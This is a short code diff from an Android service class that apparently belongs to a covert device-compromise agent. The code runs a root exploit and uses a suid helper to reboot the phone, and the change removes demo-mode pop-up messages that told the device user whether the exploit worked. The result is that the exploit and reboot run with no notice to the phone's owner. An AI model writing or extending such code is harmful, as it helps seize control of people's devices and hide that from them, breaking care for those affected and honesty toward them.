@@ -522,18 +522,11 @@ public class ServiceCore extends Service {
 					Check.log(TAG + " (onStart): Root exploit"); //$NON-NLS-1$
 				}
 
-				if (Cfg.DEMO) {
-					Toast.makeText(this, Messages.getString("32.12"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
-				}
-
 				// Riavviamo il telefono
 				Runtime.getRuntime().exec(path + "/" + suidext + " reb"); //$NON-NLS-1$ //$NON-NLS-2$
 			} else {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (onStart): exploit failed!"); //$NON-NLS-1$
-				}
-				if (Cfg.DEMO) {
-					Toast.makeText(this, Messages.getString("32.13"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 				}
 			}
 
